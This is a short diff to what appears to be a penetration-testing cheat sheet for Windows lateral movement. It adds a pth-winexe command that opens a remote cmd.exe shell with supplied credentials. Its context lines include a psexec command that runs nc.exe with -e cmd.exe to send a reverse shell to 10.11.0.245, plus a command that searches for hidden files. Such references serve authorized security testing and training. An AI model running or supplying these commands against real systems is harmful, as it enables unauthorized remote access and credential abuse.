@@ -465,6 +465,11 @@ runas /user:userName cmd.exe
 psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
 ```
 
+##### Pth-WinExe
+```bash
+pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe
+```
+
 #### Recursively Find Hidden Files: Windows
 ```bash
 dir /A:H /s "c:\program files"
